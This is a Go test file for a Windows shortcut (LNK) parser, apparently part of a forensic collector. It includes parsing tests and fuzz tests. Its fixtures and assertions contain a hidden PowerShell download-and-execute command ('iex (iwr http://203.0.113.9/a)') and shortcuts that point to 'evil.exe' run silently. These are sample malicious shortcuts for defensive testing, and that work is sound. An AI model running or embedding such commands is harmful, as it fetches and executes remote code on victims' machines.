package collector

import (
	"encoding/binary"
	"encoding/hex"
	"math/rand"
	"testing"
	"unicode/utf16"
)

// Fixtures generated with pylnk3 0.4.3, an independent MS-SHLLINK
// implementation, so the parser isn't only checked against its own reading
// of the spec.
const (
	// pylnk3.for_file(r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', ...,
	//   arguments='-nop -w hidden -c "iex (iwr http://203.0.113.9/a)"', description='Updater',
	//   work_dir=r'C:\Users\Public', window_mode='Minimized'): target only in the ID list.
	lnkIDListPS = "4c0000000114020000000000c000000000000046b501000000000000005ef45f125cdd01005ef45f125cdd01005ef45f125cdd010000000000000000070000000000000000000000000000008b0114001f50e04fd020ea3a6910a2d808002b30309d19002f433a5c000000000000000000000000000000000000003c003200000000004e5db07b100057696e646f777300260003000400efbe4e5db07b4e5db07b14000000570069006e0064006f00770073000000160040003200000000004e5db07b100053797374656d33320000280003000400efbe4e5db07b4e5db07b14000000530079007300740065006d0033003200000018005a003200000000004e5db07b100057696e646f7773506f7765725368656c6c003a0003000400efbe4e5db07b4e5db07b14000000570069006e0064006f007700730050006f007700650072005300680065006c006c000000200034003200000000004e5db07b100076312e300000200003000400efbe4e5db07b4e5db07b14000000760031002e0030000000140052003200000000004e5db07b1000706f7765727368656c6c2e6578650000340003000400efbe4e5db07b4e5db07b1400000070006f007700650072007300680065006c006c002e0065007800650000001e000000070055007000640061007400650072000f0043003a005c00550073006500720073005c005000750062006c006900630032002d006e006f00700020002d0077002000680069006400640065006e0020002d0063002000220069006500780020002800690077007200200068007400740070003a002f002f003200300033002e0030002e003100310033002e0039002f0061002900220000000000"
	// LinkInfo with a local base path, Unicode string data.
	lnkLinkInfo = "4c0000000114020000000000c000000000000046f200000000000000002b4b87125cdd01002b4b87125cdd01002b4b87125cdd01000000000000000001000000000000000000000000000000490000001c000000010000001c0000002f00000000000000480000001300000003000000d2040000100000004f5300433a5c55736572735c5075626c69635c6576696c2e65786500000f0043003a005c00550073006500720073005c005000750062006c00690063000a002f00730069006c0065006e00740020002f00780021002500530079007300740065006d0052006f006f00740025005c00530079007300740065006d00330032005c007300680065006c006c00330032002e0064006c006c0000000000"
	// ANSI string data and only a relative path.
	lnkRelative = "4c0000000114020000000000c0000000000000463c00000000000000005ef45f125cdd01005ef45f125cdd01005ef45f125cdd0100000000000000000100000000000000000000000000000004006465736324002e2e5c2e2e5c2e2e5c2e2e5c2e2e5c55736572735c5075626c69635c6576696c2e6578650f00433a5c55736572735c5075626c696307002f73696c656e7400000000"
)

func mustHex(t *testing.T, s string) []byte {
	t.Helper()
	b, err := hex.DecodeString(s)
	if err != nil {
		t.Fatal(err)
	}
	return b
}

func TestParseLNKFromIDList(t *testing.T) {
	l, err := parseLNK(mustHex(t, lnkIDListPS))
	if err != nil {
		t.Fatal(err)
	}
	if l.Target != `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` || l.TargetSource != "idlist" {
		t.Fatalf("target %q via %s", l.Target, l.TargetSource)
	}
	if l.Arguments != `-nop -w hidden -c "iex (iwr http://203.0.113.9/a)"` || l.WorkingDir != `C:\Users\Public` ||
		l.Description != "Updater" || l.ShowCommand != 7 {
		t.Fatalf("strings: %+v", l)
	}
	if got := l.Command(); got != `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "iex (iwr http://203.0.113.9/a)"` {
		t.Fatalf("command %q", got)
	}
}

func TestParseLNKFromLinkInfo(t *testing.T) {
	l, err := parseLNK(mustHex(t, lnkLinkInfo))
	if err != nil {
		t.Fatal(err)
	}
	if l.Target != `C:\Users\Public\evil.exe` || l.TargetSource != "linkinfo" || l.Arguments != "/silent /x" ||
		l.IconLocation != `%SystemRoot%\System32\shell32.dll` {
		t.Fatalf("got %+v", l)
	}
}

func TestParseLNKRelativeANSI(t *testing.T) {
	l, err := parseLNK(mustHex(t, lnkRelative))
	if err != nil {
		t.Fatal(err)
	}
	if l.Target != `..\..\..\..\..\Users\Public\evil.exe` || l.TargetSource != "relative" ||
		l.Arguments != "/silent" || l.Description != "desc" {
		t.Fatalf("got %+v", l)
	}
}

// lnkBuild assembles a minimal Unicode shortcut with the given LinkInfo and
// extra data, for shapes pylnk3 doesn't produce correctly.
func lnkBuild(flags uint32, linkInfo, extra []byte, args string) []byte {
	b := make([]byte, lnkHeaderSize)
	binary.LittleEndian.PutUint32(b, lnkHeaderSize)
	copy(b[4:], lnkCLSID)
	binary.LittleEndian.PutUint32(b[20:], flags|lnkIsUnicode|lnkHasArguments)
	binary.LittleEndian.PutUint32(b[60:], 1)
	b = append(b, linkInfo...)
	u := utf16.Encode([]rune(args))
	b = binary.LittleEndian.AppendUint16(b, uint16(len(u)))
	for _, c := range u {
		b = binary.LittleEndian.AppendUint16(b, c)
	}
	b = append(b, extra...)
	return append(b, 0, 0, 0, 0) // terminal block
}

func TestParseLNKNetworkShare(t *testing.T) {
	// LinkInfo: header 0x1C, flags=CommonNetworkRelativeLink, CNRL at 0x1C,
	// suffix after it.
	net := append([]byte(`\\fileserver\share`), 0)
	cnrl := make([]byte, 0x14)
	binary.LittleEndian.PutUint32(cnrl[0:], uint32(0x14+len(net)))
	binary.LittleEndian.PutUint32(cnrl[8:], 0x14)
	cnrl = append(cnrl, net...)
	suffix := append([]byte(`tools\run.bat`), 0)
	li := make([]byte, 0x1C)
	binary.LittleEndian.PutUint32(li[4:], 0x1C)
	binary.LittleEndian.PutUint32(li[8:], 2)
	binary.LittleEndian.PutUint32(li[20:], 0x1C)
	binary.LittleEndian.PutUint32(li[24:], uint32(0x1C+len(cnrl)))
	li = append(append(li, cnrl...), suffix...)
	binary.LittleEndian.PutUint32(li[0:], uint32(len(li)))

	l, err := parseLNK(lnkBuild(lnkHasLinkInfo, li, nil, "/q"))
	if err != nil {
		t.Fatal(err)
	}
	if l.Target != `\\fileserver\share\tools\run.bat` || l.Arguments != "/q" {
		t.Fatalf("got %+v", l)
	}
}

func TestParseLNKEnvironmentBlock(t *testing.T) {
	blk := make([]byte, 0x314)
	binary.LittleEndian.PutUint32(blk[0:], 0x314)
	binary.LittleEndian.PutUint32(blk[4:], lnkEnvBlockSig)
	copy(blk[8:], `%windir%\system32\cmd.exe`)
	for i, c := range utf16.Encode([]rune(`%windir%\system32\cmd.exe`)) {
		binary.LittleEndian.PutUint16(blk[8+260+2*i:], c)
	}
	l, err := parseLNK(lnkBuild(0, nil, blk, "/c calc"))
	if err != nil {
		t.Fatal(err)
	}
	if l.Target != `%windir%\system32\cmd.exe` || l.TargetSource != "environment" {
		t.Fatalf("got %+v", l)
	}
}

// Windows 8+ writes version-9 extension blocks whose long name sits at a
// later offset, after an 8.3 primary name.
func TestFileEntryNameV9(t *testing.T) {
	item := []byte{0, 0, 0x32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x20, 0}
	item = append(item, []byte("PROGRA~1\x00\x00")...) // 8.3 primary name, padded
	ext := make([]byte, 46)
	binary.LittleEndian.PutUint16(ext[2:], 9)
	binary.LittleEndian.PutUint32(ext[4:], 0xBEEF0004)
	for _, c := range utf16.Encode([]rune("Program Files")) {
		ext = binary.LittleEndian.AppendUint16(ext, c)
	}
	ext = append(ext, 0, 0, 0x2E, 0) // terminator + version offset
	binary.LittleEndian.PutUint16(ext[0:], uint16(len(ext)))
	item = append(item, ext...)
	binary.LittleEndian.PutUint16(item[0:], uint16(len(item)))
	if got := fileEntryName(item); got != "Program Files" {
		t.Fatalf("got %q", got)
	}
}

// Shortcuts are attacker-supplied: no truncation or corruption may panic.
func TestParseLNKNeverPanics(t *testing.T) {
	seeds := [][]byte{mustHex(t, lnkIDListPS), mustHex(t, lnkLinkInfo), mustHex(t, lnkRelative)}
	rng := rand.New(rand.NewSource(1))
	for _, s := range seeds {
		for n := 0; n <= len(s); n++ {
			_, _ = parseLNK(s[:n])
		}
		for i := 0; i < 2000; i++ {
			c := append([]byte(nil), s...)
			for j := 0; j < 1+rng.Intn(8); j++ {
				c[lnkHeaderSize/2+rng.Intn(len(c)-lnkHeaderSize/2)] = byte(rng.Intn(256))
			}
			_, _ = parseLNK(c)
		}
	}
	if _, err := parseLNK([]byte("not a shortcut at all, definitely not")); err == nil {
		t.Fatal("garbage accepted")
	}
}
